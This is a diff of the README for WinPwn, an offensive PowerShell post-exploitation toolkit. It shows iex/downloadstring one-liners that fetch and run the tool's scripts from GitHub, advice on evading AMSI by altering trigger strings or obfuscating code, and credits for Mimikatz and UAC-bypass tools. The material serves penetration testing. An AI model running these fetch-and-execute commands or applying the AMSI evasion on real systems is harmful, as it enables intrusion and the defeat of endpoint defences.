@@ -11,11 +11,9 @@ Just Import the Modules with:
 `Import-Module .\WinPwn.ps1` or 
 `iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/WinPwn.ps1')`
 
-For AMSI Bypass use the following oneliner:
+To bypass AMSI take one of the existing [bypass techniques](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell), find the AMSI [trigger](https://github.com/RythmStick/AMSITrigger) and manually change it or encode the trigger string. Alternatively obfuscate the whole script.
 
-`iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/ObfusWinPwn.ps1')`
-
-Spawn a new protected PowerShell Process that is set to run with BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON process mitigation:
+To spawn a new protected PowerShell Process that is set to run with BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON process mitigation:
 
 `iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/Obfus_SecurePS_WinPwn.ps1')`
 
@@ -110,7 +108,6 @@ Functions available after Import:
 - [x] Add MS17-10 Scanner
 - [x] Add menu for better handling of functions
 - [x] Amsi Bypass
-- [ ] Mailsniper integration
 
 ## CREDITS
 
@@ -126,7 +123,7 @@ Functions available after Import:
 - [X] [AlessandroZ](https://github.com/AlessandroZ/) - LaZagne
 - [X] [samratashok](https://github.com/samratashok/) - nishang
 - [X] [leechristensen](https://github.com/leechristensen/) - Random Repo
-- [X] [HarmJ0y](https://github.com/HarmJ0y) - Many good Blogposts, Gists and Scripts
+- [X] [HarmJ0y](https://github.com/HarmJ0y) - Many good Blogposts, Gists and Scripts, Seatbelt, Ghostpack
 - [X] [NETSPI](https://github.com/NetSPI/) - PowerUpSQL
 - [X] [Cn33liz](https://github.com/Cn33liz/) - p0wnedShell
 - [X] [rasta-mouse](https://github.com/rasta-mouse/) - AmsiScanBufferBypass
@@ -137,6 +134,8 @@ Functions available after Import:
 - [X] [James Forshaw](https://github.com/tyranid) - UACBypasses
 - [X] [Oddvar Moe](https://github.com/api0cradle) - UACBypass
 - [X] [Carlos Polop](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) - winPEAS
+- [X] [gentilkiwi](https://github.com/gentilkiwi) - Mimikatz
+- [X] [hlldz](https://github.com/hlldz) - Invoke-Phantom
 
 ## Legal disclaimer:
 Usage of WinPwn for attacking targets without prior mutual consent is illegal. It's the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program. Only use for educational purposes.
